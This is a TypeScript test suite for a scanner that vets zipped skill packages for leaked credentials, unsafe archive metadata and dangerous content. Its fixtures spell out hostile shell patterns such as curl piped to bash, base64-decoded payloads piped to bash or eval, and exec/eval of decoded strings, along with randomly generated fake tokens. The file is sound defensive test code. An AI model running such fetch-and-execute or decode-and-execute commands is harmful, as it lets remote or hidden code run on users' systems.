import { createHash, randomBytes } from "node:crypto";
import { zipSync } from "fflate";
import { describe, expect, it } from "vitest";
import { MAX_ARCHIVE_BYTES, MAX_ENTRY_COUNT, MAX_FILE_BYTES, checkCatalogPackage } from "../src/index";

function packageBytes(
  slug = "catalog-skill",
  extra: Record<string, Uint8Array | Buffer> = {},
  options: { license?: string; body?: string } = {},
): Buffer {
  const body = options.body ?? "Useful catalog instructions. ".repeat(8);
  const markdown = `---\nname: ${slug}\ndescription: A catalog skill for safe tests.\nlicense: ${options.license ?? "MIT"}\n---\n\n${body}`;
  return Buffer.from(zipSync({ "SKILL.md": Buffer.from(markdown), ...extra }));
}

function input(bytes: Buffer, slug = "catalog-skill", shareToken?: string | null) {
  return {
    bytes,
    checksum: `sha256:${createHash("sha256").update(bytes).digest("hex")}`,
    sizeBytes: bytes.length,
    slug,
    shareToken,
  };
}

function ids(result: ReturnType<typeof checkCatalogPackage>): string[] {
  return result.findings.map((finding) => finding.rule_id);
}

/** Change the central-directory Unix mode for one entry in an fflate ZIP. */
function withUnixMode(zip: Buffer, path: string, mode: number): Buffer {
  const out = Buffer.from(zip);
  for (let offset = 0; offset + 46 <= out.length; offset += 1) {
    if (out.readUInt32LE(offset) !== 0x02014b50) continue;
    const nameLength = out.readUInt16LE(offset + 28);
    const extraLength = out.readUInt16LE(offset + 30);
    const commentLength = out.readUInt16LE(offset + 32);
    const name = out.subarray(offset + 46, offset + 46 + nameLength).toString("utf8");
    if (name === path) {
      out.writeUInt16LE((3 << 8) | 20, offset + 4);
      out.writeUInt32LE(((mode & 0xffff) << 16) >>> 0, offset + 38);
      return out;
    }
    offset += 45 + nameLength + extraLength + commentLength;
  }
  throw new Error("test path was not present in ZIP");
}

function withDeclaredSize(zip: Buffer, path: string, size: number, updateLocal: boolean): Buffer {
  const out = Buffer.from(zip);
  for (let offset = 0; offset + 46 <= out.length; offset += 1) {
    if (out.readUInt32LE(offset) !== 0x02014b50) continue;
    const nameLength = out.readUInt16LE(offset + 28);
    const name = out.subarray(offset + 46, offset + 46 + nameLength).toString("utf8");
    if (name !== path) continue;
    out.writeUInt32LE(size, offset + 24);
    if (updateLocal) out.writeUInt32LE(size, out.readUInt32LE(offset + 42) + 22);
    return out;
  }
  throw new Error("test path was not present in ZIP");
}

describe("checkCatalogPackage", () => {
  it("blocks Python and JavaScript base64 decoding followed by execution", () => {
    for (const source of [
      'exec(base64.b64decode("ZmFrZSBjb21tYW5k"))',
      'eval(atob("ZmFrZSBjb21tYW5k"))',
      'new Function(Buffer.from(payload, "base64").toString())()',
    ]) {
      const result = checkCatalogPackage(input(packageBytes("catalog-skill", { "scripts/example.txt": Buffer.from(source) })));
      expect(ids(result)).toContain("base64_decode_exec");
    }
    for (const source of ['base64.b64decode(payload)', 'atob(payload)', 'Buffer.from(payload, "base64").toString()', 'function(payload) { return atob(payload); }']) {
      expect(checkCatalogPackage(input(packageBytes("catalog-skill", { "reference.txt": Buffer.from(source) }))).passed).toBe(true);
    }
  });
  it("rejects ambiguous shallowest SKILL.md roots instead of checking different release metadata", () => {
    const md = (license: string) => Buffer.from(`---\nname: catalog-skill\ndescription: Wrapped skill\nlicense: ${license}\n---\n${"Useful instructions. ".repeat(8)}`);
    const bytes = Buffer.from(zipSync({ "Z/SKILL.md": md("GPL-3.0"), "a/SKILL.md": md("MIT") }));
    expect(ids(checkCatalogPackage(input(bytes)))).toContain("skill_md_ambiguous");
  });
  it("accepts an incompressible file at the existing expanded file-size limit", () => {
    const data = randomBytes(MAX_FILE_BYTES);
    data.write("DATA", 0, "ascii");
    const bytes = packageBytes("catalog-skill", { "assets/data.bin": data });
    const result = checkCatalogPackage(input(bytes));
    expect(result.passed).toBe(true);
    // Compressing and scanning a real 10 MiB boundary fixture takes longer on shared CI CPUs.
  }, 20_000);
  it("rejects understated ZIP sizes without truncating trailing secret content", () => {
    const hidden = ["ghp_", randomBytes(20).toString("hex")].join("");
    const base = packageBytes("catalog-skill", { "nested/data.txt": Buffer.from(`safe\n${hidden}`) });
    for (const updateLocal of [false, true]) {
      const forged = withDeclaredSize(base, "nested/data.txt", 4, updateLocal);
      const result = checkCatalogPackage(input(forged));
      expect(result.passed).toBe(false);
      expect(ids(result)).toContain("archive_invalid");
      expect(JSON.stringify(result)).not.toContain(hidden);
    }
  });

  it("detects quoted JSON/YAML assignment keys and redacts complete path values", () => {
    const secret = randomBytes(24).toString("base64url");
    for (const source of [`{ "api_key": "${secret}" }`, `'secret': '${secret}'`, `"api_key_backup" = "${secret}"`]) {
      const result = checkCatalogPackage(input(packageBytes("catalog-skill", { "nested/config.json": Buffer.from(source) })));
      expect(ids(result)).toContain("secret_high_entropy_assignment");
      expect(result.findings.find(finding => finding.rule_id === "secret_high_entropy_assignment")).toMatchObject({ path: "nested/config.json", line: 1 });
      expect(JSON.stringify(result)).not.toContain(secret);
    }
    const tail = randomBytes(24).toString("base64url");
    const result = checkCatalogPackage(input(packageBytes("catalog-skill", {
      [`docs/api_key_backup=${secret}/${tail}.txt`]: Buffer.from("Instructions"),
    })));
    expect(ids(result)).toContain("secret_high_entropy_assignment");
    expect(JSON.stringify(result)).not.toContain(secret);
    expect(JSON.stringify(result)).not.toContain(tail);
    const unsafe = checkCatalogPackage(input(packageBytes("catalog-skill", {
      [`docs/"api_key_backup"="${secret}".txt`]: Buffer.from("Instructions"),
    })));
    expect(ids(unsafe)).toContain("archive_unsafe_path");
    expect(JSON.stringify(unsafe)).not.toContain(secret);
  });

  it("redacts entire PEM-shaped filenames, including material after the header", () => {
    const material = randomBytes(48).toString("base64url");
    const name = `docs/-----BEGIN PRIVATE KEY-----${material}.txt`;
    const result = checkCatalogPackage(input(packageBytes("catalog-skill", { [name]: Buffer.from("Instructions") })));
    expect(ids(result)).toContain("secret_pem_private_key");
    expect(JSON.stringify(result)).not.toContain(material);
    expect(result.findings.find(finding => finding.rule_id === "secret_pem_private_key")?.path).toBe("[REDACTED]");
  });

  it("detects Slack app and webhook credentials, including path redaction", () => {
    const appToken = ["xapp", "1", randomBytes(24).toString("hex")].join("-");
    const hookValue = randomBytes(24).toString("base64url").replace(/[_-]/g, "A");
    const hook = `https://hooks.slack.com/services/T${randomBytes(8).toString("hex").toUpperCase()}/B${randomBytes(8).toString("hex").toUpperCase()}/${hookValue}`;
    const result = checkCatalogPackage(input(packageBytes("catalog-skill", {
      "docs/slack.txt": Buffer.from(`Webhook\n${hook}\nApp\n${appToken}`),
      [`docs/${appToken}.txt`]: Buffer.from("Instructions"),
    })));
    expect(ids(result)).toContain("secret_slack");
    expect(result.findings.find(finding => finding.path === "docs/slack.txt" && finding.rule_id === "secret_slack")?.line).toBe(2);
    expect(JSON.stringify(result)).not.toContain(appToken);
    expect(JSON.stringify(result)).not.toContain(hookValue);
    const app = checkCatalogPackage(input(packageBytes("catalog-skill", { "app.txt": Buffer.from(appToken) })));
    expect(ids(app)).toContain("secret_slack");
    const unsafe = checkCatalogPackage(input(packageBytes("catalog-skill", { [hook]: Buffer.from("Instructions") })));
    expect(ids(unsafe)).toContain("archive_unsafe_path");
    expect(JSON.stringify(unsafe)).not.toContain(hookValue);
    const safe = checkCatalogPackage(input(packageBytes("catalog-skill", {
      "docs/slack.txt": Buffer.from("xapp-1-short\nhttps://hooks.slack.com/services/docs/overview/reference"),
    })));
    expect(safe.passed).toBe(true);
  });

  it("reports the source line for exact share tokens and public install tokens", () => {
    const token = randomBytes(8).toString("hex");
    for (const source of [`Instructions\n\n${token}`, `Instructions\n\nskillpack install --public '${token}'`]) {
      const result = checkCatalogPackage(input(packageBytes("catalog-skill", { "docs/token.txt": Buffer.from(source) }), "catalog-skill", source.includes("install") ? undefined : token));
      expect(result.findings.find(finding => finding.rule_id === "share_token_exposure")).toMatchObject({ path: "docs/token.txt", line: 3 });
      expect(JSON.stringify(result)).not.toContain(token);
    }
  });
  it("accepts a frozen package with a canonical license", () => {
    const result = checkCatalogPackage(input(packageBytes()));
    expect(result).toEqual({ version: 1, passed: true, findings: [] });
  });

  it("verifies the original ZIP checksum and size before parsing", () => {
    const bytes = packageBytes();
    const result = checkCatalogPackage({
      ...input(bytes),
      checksum: `sha256:${"0".repeat(64)}`,
      sizeBytes: bytes.length,
    });
    expect(result.passed).toBe(false);
    expect(ids(result)).toEqual(["package_checksum_mismatch"]);
    expect(ids(result)).not.toContain("skill_frontmatter_invalid");

    const sized = checkCatalogPackage({ ...input(bytes), sizeBytes: bytes.length + 1 });
    expect(ids(sized)).toEqual(["package_size_mismatch"]);
    expect(ids(sized)).not.toContain("skill_md_missing");
  });

  it("fails closed when bytes or checksum metadata are missing/invalid", () => {
    expect(ids(checkCatalogPackage({ checksum: "", sizeBytes: 0, slug: "catalog-skill" }))).toEqual(["package_bytes_missing"]);
    const bytes = packageBytes();
    expect(ids(checkCatalogPackage({ ...input(bytes), checksum: "not-a-checksum" }))).toEqual(["package_checksum_invalid"]);
  });

  it("requires a valid slug, selected SKILL.md name, description, and exact license", () => {
    const wrongName = checkCatalogPackage(input(packageBytes("other"), "catalog-skill"));
    expect(ids(wrongName)).toContain("skill_name_mismatch");

    const noDescriptionZip = Buffer.from(zipSync({
      "SKILL.md": Buffer.from("---\nname: catalog-skill\ndescription:    \nlicense: MIT\n---\n\nUseful instructions."),
    }));
    expect(ids(checkCatalogPackage(input(noDescriptionZip)))).toContain("skill_description_missing");

    const unsupported = checkCatalogPackage(input(packageBytes("catalog-skill", {}, { license: "GPL-3.0" })));
    expect(ids(unsupported)).toContain("license_unsupported");
    const apache = checkCatalogPackage(input(packageBytes("catalog-skill", {}, { license: "Apache-2.0" })));
    expect(apache.passed).toBe(true);
    const missingLicense = Buffer.from(zipSync({
      "SKILL.md": Buffer.from("---\nname: catalog-skill\ndescription: A description\n---\n\nUseful instructions."),
    }));
    expect(ids(checkCatalogPackage(input(missingLicense)))).toContain("license_missing");

    const padded = Buffer.from(zipSync({
      "SKILL.md": Buffer.from("---\nname: catalog-skill\ndescription: A description\nlicense: \" MIT \"\n---\n\nUseful instructions."),
    }));
    expect(ids(checkCatalogPackage(input(padded)))).toContain("license_unsupported");
    expect(ids(checkCatalogPackage({ ...input(packageBytes()), slug: "Bad_Slug" }))).toContain("skill_slug_invalid");
  });

  it("fails closed for a missing or malformed selected SKILL.md", () => {
    const absent = Buffer.from(zipSync({ "README.md": Buffer.from("package") }));
    expect(ids(checkCatalogPackage(input(absent)))).toContain("skill_md_missing");

    const malformed = Buffer.from(zipSync({ "SKILL.md": Buffer.from("name: catalog-skill\nnot frontmatter") }));
    expect(ids(checkCatalogPackage(input(malformed)))).toContain("skill_frontmatter_invalid");

    const invalidName = Buffer.from(zipSync({
      "SKILL.md": Buffer.from(`---\nname: Bad_Name\ndescription: A description\nlicense: MIT\n---\n\n${"Useful instructions. ".repeat(8)}`),
    }));
    expect(ids(checkCatalogPackage(input(invalidName)))).toContain("skill_name_invalid");
  });

  it("selects the shallowest wrapper SKILL.md and still scans all other files", () => {
    const bytes = packageBytes("catalog-skill", {
      "catalog-skill/SKILL.md": Buffer.from(`---\nname: catalog-skill\ndescription: Wrapped skill\nlicense: MIT\n---\n\n${"Useful wrapper instructions. ".repeat(8)}`),
      "nested/.git/ignored.txt": Buffer.from(`token ${"ghp_" + randomBytes(20).toString("hex")}`),
    });
    const result = checkCatalogPackage(input(bytes));
    expect(result.findings.some((finding) => finding.rule_id === "secret_github")).toBe(true);
    expect(result.findings.find((finding) => finding.rule_id === "secret_github")?.path).toBe("nested/.git/ignored.txt");
    expect(result.passed).toBe(false);
  });

  it("reports a contradictory canonical LICENSE without exposing its contents", () => {
    const bytes = packageBytes("catalog-skill", {
      LICENSE: Buffer.from("Apache License, Version 2.0\nhttp://www.apache.org/licenses/LICENSE-2.0"),
    });
    const result = checkCatalogPackage(input(bytes));
    expect(ids(result)).toContain("license_contradiction");
    expect(JSON.stringify(result)).not.toContain("Apache License");
  });

  it("does not infer a contradiction from a vendored nested LICENSE", () => {
    const bytes = packageBytes("catalog-skill", {
      "vendor/component/LICENSE": Buffer.from("Apache License, Version 2.0"),
    });
    expect(ids(checkCatalogPackage(input(bytes)))).not.toContain("license_contradiction");
  });

  it("only warns for a thin body", () => {
    const bytes = packageBytes("catalog-skill", {}, { body: "Short." });
    const result = checkCatalogPackage(input(bytes));
    expect(result.passed).toBe(true);
    expect(result.findings).toEqual([{ rule_id: "body_thin", severity: "warning", path: "SKILL.md" }]);
  });

  it("scans nested and excluded paths, binary bytes, and executable modes", () => {
    const bytes = withUnixMode(packageBytes("catalog-skill", {
      ".git/config": Buffer.from(`aws ${"AKIA" + randomBytes(8).toString("hex").toUpperCase()}`),
      "node_modules/dependency.bin": Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x00]),
      "assets/pe.exe": Buffer.from("MZ\x90\x00", "latin1"),
      "scripts/run.sh": Buffer.from("echo safe"),
    }), "scripts/run.sh", 0o100755);
    const result = checkCatalogPackage(input(bytes));
    expect(ids(result)).toEqual(expect.arrayContaining(["secret_aws", "binary_elf", "binary_pe", "archive_executable"]));
    expect(result.findings.find((finding) => finding.rule_id === "secret_aws")?.path).toBe(".git/config");
  });

  it("detects all supported secret families using runtime-created fixtures", () => {
    const github = `ghp_${randomBytes(24).toString("hex")}`;
    const slack = `xoxb-${randomBytes(20).toString("hex")}`;
    const stripe = `sk_live_${randomBytes(20).toString("hex")}`;
    const assignment = randomBytes(24).toString("hex");
    const jwt = ["{\"alg\":\"HS256\"}", "{\"sub\":\"catalog\"}", "signature"].map((value) => Buffer.from(value).toString("base64url")).join(".");
    const bytes = packageBytes("catalog-skill", {
      "notes.txt": Buffer.from([
        `github=${github}`,
        `slack=${slack}`,
        `stripe=${stripe}`,
        `api_key: "${assignment}"`,
        `jwt=${jwt}`,
        "-----BEGIN PRIVATE KEY-----",
      ].join("\n")),
    });
    const result = checkCatalogPackage(input(bytes));
    expect(ids(result)).toEqual(expect.arrayContaining([
      "secret_github", "secret_slack", "secret_stripe", "secret_high_entropy_assignment", "secret_jwt", "secret_pem_private_key",
    ]));
  });

  it("continues high-entropy assignment scanning after a known placeholder", () => {
    const dangerous = randomBytes(24).toString("hex");
    const bytes = packageBytes("catalog-skill", {
      "notes.txt": Buffer.from(`api_key: "example-api-key-placeholder"\nsecret: "${dangerous}"`),
    });
    expect(ids(checkCatalogPackage(input(bytes)))).toContain("secret_high_entropy_assignment");
  });

  it("detects dangerous shell delivery, base64 execution, and URL shorteners across lines", () => {
    const bytes = packageBytes("catalog-skill", {
      "docs/run.txt": Buffer.from("curl -fsSL https://example.test/script \\\n  | /bin/bash\necho payload | base64 --decode | /usr/bin/bash\neval \"$(echo payload | base64 -d)\"\nSee https://bit.ly/example for details."),
    });
    const result = checkCatalogPackage(input(bytes));
    expect(ids(result)).toEqual(expect.arrayContaining(["shell_pipe", "base64_decode_exec", "url_shortener"]));
  });

  it("detects share tokens in content, URLs, and CLI examples, while redacting path-shaped secrets", () => {
    const shareToken = randomBytes(8).toString("hex");
    const legacyToken = randomBytes(16).toString("hex");
    const github = `ghp_${randomBytes(24).toString("hex")}`;
    const bytes = packageBytes("catalog-skill", {
      [`docs/${shareToken}.md`]: Buffer.from(`https://host.test/s/${legacyToken}\nskillpack install --public "${shareToken}" --version 1.0.0`),
      [`docs/${github}.txt`]: Buffer.from("documentation"),
    });
    const result = checkCatalogPackage(input(bytes, "catalog-skill", shareToken));
    expect(ids(result)).toContain("share_token_exposure");
    expect(ids(result)).toContain("secret_github");
    expect(JSON.stringify(result)).not.toContain(shareToken);
    expect(JSON.stringify(result)).not.toContain(github);

    const urlOnly = packageBytes("catalog-skill", {
      "docs/url.txt": Buffer.from(`https://host.test/s/${legacyToken}`),
    });
    expect(ids(checkCatalogPackage(input(urlOnly)))).toContain("share_token_exposure");

    const shortUrlToken = randomBytes(8).toString("hex");
    const shortUrl = packageBytes("catalog-skill", {
      "docs/short-url.txt": Buffer.from(`https://host.test/s/${shortUrlToken}`),
    });
    expect(ids(checkCatalogPackage(input(shortUrl)))).toContain("share_token_exposure");

    const cliToken = randomBytes(8).toString("hex");
    const cliOnly = packageBytes("catalog-skill", {
      "docs/install.txt": Buffer.from(`skillpack install --public '${cliToken}'`),
    });
    expect(ids(checkCatalogPackage(input(cliOnly)))).toContain("share_token_exposure");
  });

  it("rejects unsafe, duplicate-colliding, symlink, and nonempty-directory ZIP metadata", () => {
    const unsafe = Buffer.from(zipSync({ "SKILL.md": Buffer.from("x"), "../escape.txt": Buffer.from("x") }));
    expect(ids(checkCatalogPackage(input(unsafe)))).toContain("archive_unsafe_path");

    const collision = Buffer.from(zipSync({ "SKILL.md": Buffer.from("x"), "A/file.txt": Buffer.from("a"), "a/other.txt": Buffer.from("b") }));
    expect(ids(checkCatalogPackage(input(collision)))).toContain("archive_duplicate_path");

    const symlink = withUnixMode(packageBytes(), "SKILL.md", 0o120777);
    expect(ids(checkCatalogPackage(input(symlink)))).toContain("archive_symlink");

    const directory = Buffer.from(zipSync({ "SKILL.md": Buffer.from("x"), "data/": Buffer.from("x") }));
    expect(ids(checkCatalogPackage(input(directory)))).toContain("archive_invalid");
  });

  it("enforces file, aggregate, and entry-count bounds before parsing", () => {
    const compressedOversized = Buffer.alloc(MAX_ARCHIVE_BYTES + 1);
    expect(ids(checkCatalogPackage(input(compressedOversized)))).toContain("archive_size");

    const oversized = Buffer.from(zipSync({ "SKILL.md": Buffer.from("x"), "large.bin": Buffer.alloc(MAX_FILE_BYTES + 1) }));
    expect(ids(checkCatalogPackage(input(oversized)))).toContain("archive_file_size");

    const chunk = Buffer.alloc(9 * 1024 * 1024);
    const aggregate = Buffer.from(zipSync(Object.fromEntries([
      ["SKILL.md", Buffer.from("x")], ["a.bin", chunk], ["b.bin", chunk], ["c.bin", chunk],
    ]), { level: 0 }));
    expect(ids(checkCatalogPackage(input(aggregate)))).toContain("archive_size");

    const many = [["SKILL.md", Buffer.from("x")], ...Array.from({ length: MAX_ENTRY_COUNT }, (_, index) => [`files/${index}.txt`, Buffer.from("x")])];
    const count = Buffer.from(zipSync(Object.fromEntries(many)));
    expect(ids(checkCatalogPackage(input(count)))).toContain("archive_entry_count");

    expect(MAX_ARCHIVE_BYTES).toBeGreaterThan(MAX_FILE_BYTES);
  });

  it("does not flag documented placeholders or non-dangerous lookalikes", () => {
    const bytes = packageBytes("catalog-skill", {
      "docs/examples.md": Buffer.from([
        'api_key: "example-api-key-placeholder"',
        "curl https://example.test | jq .",
        "https://bit.ly.example.test/path",
        "eyJnot-a-jwt.without-a-signature",
        "AKIA1234",
      ].join("\n")),
    });
    const result = checkCatalogPackage(input(bytes));
    expect(result.passed).toBe(true);
    expect(ids(result)).toEqual([]);
  });

  it("rejects near misses for every blocking pattern family", () => {
    const nearAws = `AKIA${"A".repeat(15)}`;
    const nearGithub = `ghp_${randomBytes(9).toString("hex")}`;
    const nearSlack = `xoxb-${"a".repeat(9)}`;
    const nearStripe = `sk_live_${"a".repeat(15)}`;
    const nearJwt = "eyJinvalid-header.invalid-payload.invalid-signature";
    const nearShare = randomBytes(7).toString("hex");
    const bytes = packageBytes("catalog-skill", {
      "docs/near-misses.txt": Buffer.from([
        nearAws,
        nearGithub,
        "-----BEGIN PRIVATE KEY----",
        nearSlack,
        nearStripe,
        `jwt=${nearJwt}`,
        'api_key: "short"',
        "curl https://example.test | jq .",
        "base64 --decode payload.txt > payload.bin",
        "https://bit.ly.example.test/path",
        `https://host.test/s/${nearShare}`,
      ].join("\n")),
    });
    const result = checkCatalogPackage(input(bytes));
    expect(result.passed).toBe(true);
    expect(ids(result)).toEqual([]);
  });

  it("does not treat a realistic value with a placeholder-like prefix as documentation", () => {
    const value = `example_${randomBytes(24).toString("hex")}`;
    const bytes = packageBytes("catalog-skill", {
      "docs/example.txt": Buffer.from(`api_key: "${value}"`),
    });
    expect(ids(checkCatalogPackage(input(bytes)))).toContain("secret_high_entropy_assignment");
  });
});
